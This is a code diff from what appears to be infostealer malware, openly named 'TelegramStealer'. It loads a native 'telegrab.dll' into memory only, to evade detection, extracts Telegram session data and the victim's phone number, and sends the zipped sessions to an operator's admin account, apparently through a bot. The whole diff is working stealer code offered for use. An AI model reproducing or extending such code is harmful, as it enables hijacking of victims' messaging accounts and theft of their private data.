@@ -6,32 +6,74 @@ from typing import Any, Dict, List, Optional
 from core.cloud import CloudModule
 from core.obfuscation import decrypt_string
 
+from core.base import BaseModule
+
 try:
     import clr
     CLR_AVAILABLE = True
 except ImportError:
     CLR_AVAILABLE = False
 
-class TelegramStealer:
-    """Native-first Telegram stealer using C# telegrab module with cloud upload support"""
-    def __init__(self, temp_dir):
-        self.temp_dir = temp_dir
+class TelegramStealer(BaseModule):
+    """Native-first Telegram stealer using C# telegrab module (A-04)"""
+    def __init__(self, bot=None, report_manager=None, temp_dir=None):
+        super().__init__(bot, report_manager, temp_dir)
         self.appdata = os.environ.get('APPDATA', '')
+        self.protector = None
         self._load_protector()
+        self.last_result = {}
 
     def _load_protector(self):
-        self.protector = None
         if not CLR_AVAILABLE:
             return
         try:
-            project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-            dll_path = os.path.join(project_root, "defense", decrypt_string("GlcUDikjOAB0EwZU"))
-            if os.path.exists(dll_path):
-                clr.AddReference(dll_path)
-                from StealthModule import TelegrabManager
-                self.protector = TelegrabManager
+            from System.Reflection import Assembly
+            from System.IO import File
+            dll_name = "telegrab.dll"
+            # Search in current dir, core/ and native_modules/
+            search_paths = [
+                os.path.join(os.path.dirname(__file__), dll_name),
+                os.path.join(os.path.dirname(__file__), "..", "native_modules", dll_name),
+                os.path.join(os.getcwd(), "native_modules", dll_name)
+            ]
+            
+            for _p in search_paths:
+                if os.path.exists(_p):
+                    try:
+                        # S-09: RAM-Only loading from byte array
+                        raw_bytes = File.ReadAllBytes(os.path.abspath(_p))
+                         # We use Assembly.Load to avoid locking the file and keep it in RAM
+                        Assembly.Load(raw_bytes)
+                        from StealthModule import TelegrabManager
+                        self.protector = TelegrabManager
+                        break
+                    except: continue
         except:
             pass
+
+    def run(self) -> bool:
+        """A-04: Implementation of standardized run method."""
+        try:
+            self.log("Starting Telegram session extraction...")
+            result = self.steal_sessions(status_callback=self.log)
+            self.last_result = result
+            
+            if result.get('zip_path') and self.report_manager:
+                caption = f"🛡️ Telegram Sessions ({len(result['sessions'])}found)"
+                if result.get('phone'):
+                    caption += f"\n📱 Phone: {result['phone']}"
+                if result.get('cloud_link'):
+                    caption += f"\n☁️ Cloud: {result['cloud_link']}"
+                
+                self.report_manager.safe_send_document(self.report_manager.admin_id, result['zip_path'], caption=caption)
+            
+            return True if result.get('sessions') else False
+        except Exception as e:
+            self.log(f"Telegram extraction failed: {e}")
+            return False
+
+    def get_stats(self) -> Dict[str, int]:
+        return {"sessions": len(self.last_result.get("sessions", []))}
 
     def steal_sessions(self, status_callback=None) -> Dict[str, Any]:
         """
